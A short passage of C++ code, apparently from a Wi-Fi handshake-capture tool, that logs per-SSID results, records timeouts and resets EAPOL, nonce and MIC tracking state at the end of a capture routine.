        logMessage("File write queued for: " + ap.ssid);
    } else {
        logMessage("Handshake timeout for: " + ap.ssid);
        if (std::find(failedClients.begin(), failedClients.end(), ap.ssid) == failedClients.end())
            failedClients.push_back(ap.ssid);
    }

    // Reset state
    beaconDetected = false;
    eapolCount     = 0;
    targetAPSet    = false;
    hasANonce = hasSNonce = hasMIC = false;
    if (beaconFrame) { free(beaconFrame); beaconFrame = nullptr; }
}